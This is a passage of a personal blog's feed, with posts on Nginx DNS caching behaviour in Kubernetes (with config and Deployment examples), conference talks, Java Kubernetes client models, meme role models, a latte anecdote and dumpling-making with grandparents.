</span></code></pre></td></tr></table></div></figure>


<p>After more bisection, I found that this specific instance of <code>gke-metadata-server</code>
starts to fail around 150RPS. When it does fail, p99 latency skyrockets from less than 1 second to
30 seconds. This is usually a sign of a rate limiter or quota.</p>

<p>How have you tried load testing WI or other GKE features? What&rsquo;re your favorite load testing tools
for these cases, and what interesting behavior have you found?</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Becoming a Better Public Speaker]]></title>
    <link href="https://www.davidxia.com/2019/05/becoming-a-better-public-speaker/"/>
    <updated>2019-05-26T00:04:59+02:00</updated>
    <id>https://www.davidxia.com/2019/05/becoming-a-better-public-speaker</id>
    <content type="html"><![CDATA[<p>At the beginning of this year I set a goal of becoming a better public speaker
and more visible in both tech and other broader causes I believe in. I&rsquo;m happy
to say that in the last two months I gave three talks! Two were prepared talks
with slides at tech conferences. The other was an unprepared conversation on a
podcast. These were all technical and related to my work at Spotify. Outside
of Spotify, I spoke for one minute at a mock political town hall in front of
about 30 people and at a public policy forum for ~15 minutes in front of
roughly the same number of people. But more on that later. Here are my
technical talks. These talks wouldn&rsquo;t be possible without the help, feedback,
and moral support from my Spotify colleagues.</p>

<h2>1. Keynote at KubeCon + CloudNativeCon Europe 2019 in Barcelona on May 22, 2019</h2>

<p><a href="https://kccnceu19.sched.com/event/MQbb/keynote-how-spotify-accidentally-deleted-all-its-kube-clusters-with-no-user-impact-david-xia-infrastructure-engineer-spotify">&ldquo;How Spotify Accidentally Deleted All its Kube Clusters with No User Impact&rdquo;</a></p>

<iframe width="750" height="422" src="https://www.youtube.com/embed/ix0Tw8uinWs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


<h2>2. Kubernetes Podcast from Google on April 23, 2019</h2>

<p><a href="https://kubernetespodcast.com/episode/050-spotify/">&ldquo;Spotify, with David Xia&rdquo;</a>. Listen on <a href="https://open.spotify.com/show/0AsnxlMtXRUEeZkIO0ScpJ">Spotify here</a>.</p>

<h2>3. Joint talk with Google at Google Next SF on April 11, 2019</h2>

<p><a href="https://cloud.withgoogle.com/next/sf/sessions?session=HYB316">&ldquo;GKE Usage Metering: Whose Line Item Is It Anyway?&rdquo;</a></p>

<iframe width="750" height="422" src="https://www.youtube.com/embed/EuBc1v27hY8?start=1036" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[More About Nginx DNS Resolution Than You Ever Wanted to Know]]></title>
    <link href="https://www.davidxia.com/2019/05/more-about-nginx-dns-resolution-than-you-ever-wanted-to-know/"/>
    <updated>2019-05-17T12:58:38-04:00</updated>
    <id>https://www.davidxia.com/2019/05/more-about-nginx-dns-resolution-than-you-ever-wanted-to-know</id>
    <content type="html"><![CDATA[<p>This is a post about Nginx&rsquo;s DNS resolution behavior I didn&rsquo;t know about but wish I did before I
started using Kubernetes (K8s).</p>

<h2>Nginx caches statically configured domains once</h2>

<h3>Symptoms</h3>

<p>I moved a backend service <code>foo</code> from running on a virtual machine to K8s. Foo&rsquo;s clients include an
Nginx instance running outside K8s configured with this <code>upstream</code> block.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>upstream foo {
</span><span class='line'>  server foo.example.com.;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>server {
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>  location ~* /_foo/(.*) {
</span><span class='line'>    proxy_pass https://foo/$1;
</span><span class='line'>    ...
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>K8s Pods can be rescheduled anytime so their IPs aren&rsquo;t stable. I&rsquo;m supposed to use K8s Services
to avoid caching these ephemeral Pod IPs. But in my case because of interoperability reasons I was
registering Pod IPs directly as A records for <code>foo.example.com.</code>. I started noticing that after my Pod
IPs changed either because of rescheduling or updating the Deployment, Nginx started throwing
<code>502 Bad Gateway</code> errors.</p>

<h3>Root Problem</h3>

<p>Nginx resolves statically configured domain names only once at startup or configuration
reload time. So Nginx resolved <code>foo.example.com.</code> once at startup to several Pod IPs and cached
them forever.</p>

<h3>Solution</h3>

<!-- more -->


<p>Using a variable for the domain name will make Nginx resolve and cache it using the TTL value of the
DNS response. So replace the <code>upstream</code> block with a variable. I have no idea why it has to be a
variable to make Nginx resolve the domain periodically.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>set $foo_url foo.example.com.;</span></code></pre></td></tr></table></div></figure>


<p>And replace the <code>proxy_pass</code> line with</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  location ~* /_foo/(.*) {
</span><span class='line'>    proxy_pass https://$foo_url/$1;
</span><span class='line'>    ...
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>This behavior isn&rsquo;t documented but has been observed empirically and discussed <a href="https://serverfault.com/a/593003/88755">here</a>, <a href="https://stackoverflow.com/a/41476524/553994">here</a>,
and <a href="https://www.ruby-forum.com/t/using-127-0-0-1-in-resolver/238180/4">here</a>. I also learned that this setup requires me to define a <code>resolver</code> in the Nginx configs.
<strong>For some reason Nginx resolves statically configured domains by querying the nameserver specified in
<code>/etc/resolv.conf</code> but periodically resolved domains require a completely different config
setting.</strong> I would love to know why.</p>

<p>The VM on which Nginx was running ran a Bind DNS server locally, so I set <code>resolver 127.0.0.1</code>.
I triggered the code path that made Nginx send requests to foo and saw periodic DNS queries
occurring with <code>sudo tcpdump -i lo -n dst port 53 | grep foo</code>.</p>

<h2>What if that Nginx is also running on K8s?</h2>

<h3>Problem</h3>

<p>I had another Nginx instance that also made requests to foo. This Nginx was running on K8s too. It
was created with this Deployment YAML.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">apps/v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Deployment</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">selector</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">matchLabels</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>  <span class="l-Scalar-Plain">template</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>    <span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>        <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">openresty/openresty:trusty</span>
</span><span class='line'>        <span class="l-Scalar-Plain">ports</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">https</span>
</span><span class='line'>            <span class="l-Scalar-Plain">containerPort</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">443</span>
</span><span class='line'>            <span class="l-Scalar-Plain">protocol</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">TCP</span>
</span><span class='line'>        <span class="l-Scalar-Plain">volumeMounts</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'>            <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/nginx/conf.d</span>
</span><span class='line'>      <span class="l-Scalar-Plain">volumes</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'>          <span class="l-Scalar-Plain">configMap</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>nginx-config</code> ConfigMap was</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">ConfigMap</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'><span class="l-Scalar-Plain">data</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">nginx.conf</span><span class="p-Indicator">:</span> <span class="p-Indicator">|</span>
</span><span class='line'>    <span class="no">upstream foo {</span>
</span><span class='line'>      <span class="no">server foo.example.com.:443;</span>
</span><span class='line'>    <span class="no">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="no">server {</span>
</span><span class='line'>      <span class="no">...</span>
</span><span class='line'>
</span><span class='line'>      <span class="no"># use regex capture to preserve url path and query params</span>
</span><span class='line'>      <span class="no">location ~* /_foo/(.*) {</span>
</span><span class='line'>        <span class="no">proxy_pass https://foo/$1;</span>
</span><span class='line'>        <span class="no">...</span>
</span><span class='line'>      <span class="no">}</span>
</span><span class='line'>    <span class="no">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>I replaced <code>upstream</code> with the same pattern above, but in this case when I needed to define
<code>resolver</code> I couldn&rsquo;t use <code>127.0.0.1</code> because there&rsquo;s no Bind running locally. I can&rsquo;t hardcode the
resolver because it might change.</p>

<h3>Solution: run Nginx and foo on the same K8s cluster and use the cluster-local Service DNS record</h3>

<p>If Nginx and foo run on the same K8s cluster, I can use the cluster-local DNS record created by a
K8s Service matching the foo Pods. A Service like this</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Service</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">foo</span>
</span><span class='line'>  <span class="l-Scalar-Plain">namespace</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">bar</span>
</span><span class='line'><span class="nn">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>will create a DNS A record <code>foo.bar.svc.cluster.local.</code> pointing to the K8s Service&rsquo;s IP.
Since this Service&rsquo;s IP is stable and it load balances requests to the underlying Pods, there&rsquo;s no need for Nginx to
periodically lookup the Pod IPs. I can keep the <code>upstream</code> block like so.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">upstream foo {</span>
</span><span class='line'>  <span class="l-Scalar-Plain">server foo.bar.svc.cluster.local.:443;</span>
</span><span class='line'><span class="l-Scalar-Plain">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As its name implies, <code>foo.bar.svc.cluster.local.</code> is only resolvable within the cluster. So
Nginx has to be running on the same cluster as foo.</p>

<h3>Solution: dynamically set the Nginx <code>resolver</code> equal to the system&rsquo;s when the Pod starts</h3>

<p><strong>Disclaimer: This &ldquo;solution&rdquo; is more of an ugly, brittle hack that should only be used as a last
resort.</strong></p>

<p>What if Nginx is on another K8s cluster? Then I can set <code>resolver</code> to the IP of one of the
nameservers in <code>/etc/resolv.conf</code>. After a bunch of tinkering I came up with this way to dynamically
set the Nginx <code>resolver</code> when the Pod starts. A placeholder for <code>resolver</code> is set in the Nginx
ConfigMap, and a command at Pod startup copies over the templated config and replaces the
placeholder with a nameserver IP from <code>/etc/resolv.conf</code>.</p>

<p>Change <code>nginx-config</code> ConfigMap to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">ConfigMap</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'><span class="l-Scalar-Plain">data</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">nginx.conf.template</span><span class="p-Indicator">:</span> <span class="p-Indicator">|</span>
</span><span class='line'>    <span class="no">server {</span>
</span><span class='line'>      <span class="no">...</span>
</span><span class='line'>
</span><span class='line'>      <span class="no"># This directive is dynamic because we set it to the</span>
</span><span class='line'>      <span class="no"># kube-dns Service IP which is different for each cluster.</span>
</span><span class='line'>      <span class="no">resolver $NAMESERVER;</span>
</span><span class='line'>
</span><span class='line'>      <span class="no">set $foo_url foo.example.com.;</span>
</span><span class='line'>
</span><span class='line'>      <span class="no"># use regex capture to preserve url path and query params</span>
</span><span class='line'>      <span class="no">location ~* /_foo/(.*) {</span>
</span><span class='line'>        <span class="no">proxy_pass https://$foo_url/$1;</span>
</span><span class='line'>        <span class="no">...</span>
</span><span class='line'>      <span class="no">}</span>
</span><span class='line'>    <span class="no">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Deployment YAML then becomes (note the added <code>command</code>, <code>args</code>, and new <code>volume</code> and <code>volumeMount</code>).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">apps/v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Deployment</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">selector</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">matchLabels</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>  <span class="l-Scalar-Plain">template</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>    <span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>        <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">openresty/openresty:trusty</span>
</span><span class='line'>        <span class="l-Scalar-Plain">command</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="s">&#39;/bin/bash&#39;</span><span class="p-Indicator">,</span> <span class="s">&#39;-c&#39;</span><span class="p-Indicator">]</span>
</span><span class='line'>        <span class="l-Scalar-Plain">args</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="p-Indicator">|</span>
</span><span class='line'>          <span class="no">export NAMESERVER=$(grep &#39;nameserver&#39; /etc/resolv.conf | awk &#39;{print $2}&#39; | tr &#39;\n&#39; &#39; &#39;)</span>
</span><span class='line'>          <span class="no">echo &quot;Nameserver is: $NAMESERVER&quot;</span>
</span><span class='line'>          <span class="no">echo &#39;Copying nginx config&#39;</span>
</span><span class='line'>          <span class="no">envsubst &#39;$NAMESERVER&#39; &lt; /etc/nginx/conf.d.template/nginx.conf.template &gt; /etc/nginx/conf.d/nginx.conf</span>
</span><span class='line'>          <span class="no">echo &#39;Using nginx config:&#39;</span>
</span><span class='line'>          <span class="no">cat /etc/nginx/conf.d/nginx.conf</span>
</span><span class='line'>          <span class="no">echo &#39;Starting nginx&#39;</span>
</span><span class='line'>          <span class="no">nginx -g &#39;daemon off;&#39;</span>
</span><span class='line'>        <span class="l-Scalar-Plain">ports</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">https</span>
</span><span class='line'>            <span class="l-Scalar-Plain">containerPort</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">443</span>
</span><span class='line'>            <span class="l-Scalar-Plain">protocol</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">TCP</span>
</span><span class='line'>        <span class="l-Scalar-Plain">volumeMounts</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config-template</span>
</span><span class='line'>            <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/nginx/conf.d.template</span>
</span><span class='line'>          <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'>            <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/nginx/conf.d</span>
</span><span class='line'>      <span class="l-Scalar-Plain">volumes</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'>          <span class="l-Scalar-Plain">emptyDir</span><span class="p-Indicator">:</span> <span class="p-Indicator">{}</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config-template</span>
</span><span class='line'>          <span class="l-Scalar-Plain">configMap</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span></code></pre></td></tr></table></div></figure>


<p>A <code>volume</code> of type <code>emptyDir</code> is needed because recent versions of K8s made configMap volumes
read-only. EmptyDir types are writable.</p>

<p>Hopefully this helps some people out there who don&rsquo;t want to spend as much time as I did Googling
obscure Nginx behavior.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Using Upstream Kubernetes Java Models Is Much Better Than Raw YAML]]></title>
    <link href="https://www.davidxia.com/2018/11/using-upstream-kubernetes-java-models-is-much-better-than-raw-yaml/"/>
    <updated>2018-11-11T17:11:38-05:00</updated>
    <id>https://www.davidxia.com/2018/11/using-upstream-kubernetes-java-models-is-much-better-than-raw-yaml</id>
    <content type="html"><![CDATA[<p>It&rsquo;s been a while since I blogged about something tech related, but I had some
free time today.</p>

<p>Recently, I&rsquo;ve been trying to refactor an internal Spotify deployment tool my
team built and maintains. This deployment tool takes Kubernetes (k8s) YAML
manifests, changes them, and essentially runs <code>kubectl apply</code>. We add metadata
to the k8s manifests like labels.</p>

<p>Right now this tool receives the input YAML as strings, converts them to
Jackson ObjectNodes, and manipulates those ObjectNodes. The disadvantage of
this is that there&rsquo;s no k8s type-safety. We might accidentally add a field to a
Deployment that isn&rsquo;t valid or remove something from a Service that&rsquo;s required.</p>

<p>My refactor uses upstream k8s model classes from <a href="https://github.com/kubernetes-client/java">kubernetes-client/java</a>
which are themselves <a href="https://github.com/kubernetes-client/gen">generated</a> from the official Swagger spec. Here&rsquo;s a
helpful Yaml utility class that deserializes YAML strings into concrete classes
and can also serialize them back into YAML strings. So helpful.</p>

<p>Unfortunately, there&rsquo;s some bugs in the YAML (de)serialization that prevent me
from finishing this effort.</p>

<ul>
<li><a href="https://github.com/kubernetes-client/java/pull/417">kubernetes-client/java issue 417</a></li>
<li><a href="https://github.com/kubernetes-client/java/issues/431">kubernetes-client/java issue 431</a></li>
<li><a href="https://github.com/kubernetes-client/java/issues/340">kubernetes-client/java issue 340</a></li>
</ul>


<p>Nonetheless, it&rsquo;ll be much nicer to change k8s resources in a type-safe way
instead of parsing and rewriting raw YAML strings.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Internet Meme Role Models]]></title>
    <link href="https://www.davidxia.com/2018/01/internet-meme-role-models/"/>
    <updated>2018-01-07T11:29:18-05:00</updated>
    <id>https://www.davidxia.com/2018/01/internet-meme-role-models</id>
    <content type="html"><![CDATA[<p>I&rsquo;m compiling a list of Internet meme role models. Here&rsquo;s what I have so far. These people &mdash;
they must be real human beings &mdash; must have either gone out of their way to do the right
thing in a smart manner, something courageous with bonus points for being funny, or just be
ridiculous. And they must be memeified. Exceptions will be made for exceptional but not
memeified people like Hilde Lysiak.</p>

<p>Who else deserves to be on this list?</p>

<ul>
<li><a href="https://www.youtube.com/watch?v=b58mzz7mQpg">Snack Man</a> defused a violent fight on the subway between a couple before anyone got hurt. He did
it by standing in between them and munching on Pringles and Gummy Bears.</li>
<li><a href="https://www.youtube.com/watch?v=m9Md78SJO6s">Ben Innes</a> asked the EgyptAir Flight 181 hijacker who comandeered the airplane with a fake
explosive belt if he could take a selfie with him. &ldquo;I thought, why not? If he blows us all up it
won&rsquo;t matter anyway.&rdquo;</li>
<li><a href="https://www.nytimes.com/2017/10/31/books/hilde-lysiak-child-reporter.html">Hilde Lysiak</a> is ten years old and the writer and publisher of Orange Street News.
She <a href="https://www.youtube.com/watch?v=0ShfNQOUeAY">doesn&rsquo;t take shit from anyone</a>.</li>
<li>Salt Bae is&hellip;well you just have to <a href="https://www.youtube.com/watch?v=xWMWJwXvzWk&amp;t=376s">see for yourself</a>.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Now Max Knows How to Make a Latte]]></title>
    <link href="https://www.davidxia.com/2017/08/now-max-knows-how-to-make-a-latte/"/>
    <updated>2017-08-30T01:19:06-04:00</updated>
    <id>https://www.davidxia.com/2017/08/now-max-knows-how-to-make-a-latte</id>
    <content type="html"><![CDATA[<p>I work at a music company but am more interested in politics and history. Artists visit our
office often.</p>

<p>So I, often being ignorant of their fame, have casually interacted with them or criticized their
milk steaming techniques when they&rsquo;re using the office&rsquo;s $20K espresso machine.</p>

<p>Only later am I told by their posse, &ldquo;Did you know that was Mark Ronson/Bebe Rhexa/Max Martin/etc?&rdquo;</p>

<p>&ldquo;It&rsquo;s OK,&rdquo; I say. &ldquo;Now Max knows how to make a real latte.&rdquo;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Making Dumplings With My Grandparents]]></title>
    <link href="https://www.davidxia.com/2017/07/making-dumplings-with-my-grandparents/"/>
    <updated>2017-07-05T22:50:03-04:00</updated>
    <id>https://www.davidxia.com/2017/07/making-dumplings-with-my-grandparents</id>
    <content type="html"><![CDATA[<p>Whenever I go back home to my parents&#8217; house near Boston,
if my maternal grandparents are there, they make hundreds of dumplings for me.
I try to help out. We make everything from scratch including the skins. I&rsquo;m good at rolling the
skins but have much to learn on all other parts of the process. I&rsquo;m becoming better at packing
and closing the dumplings now though.</p>

<p>I&rsquo;ve come to cherish this little tradition more and more. I need to plan my next trip to Boston!</p>

<p><img class="center" src="https://i.imgur.com/FkpZb8Jh.jpg"></p>

<!-- more -->


<p><img class="center" src="https://i.imgur.com/InwCZuBh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/bT9F8neh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/qMkalGoh.jpg"></p>

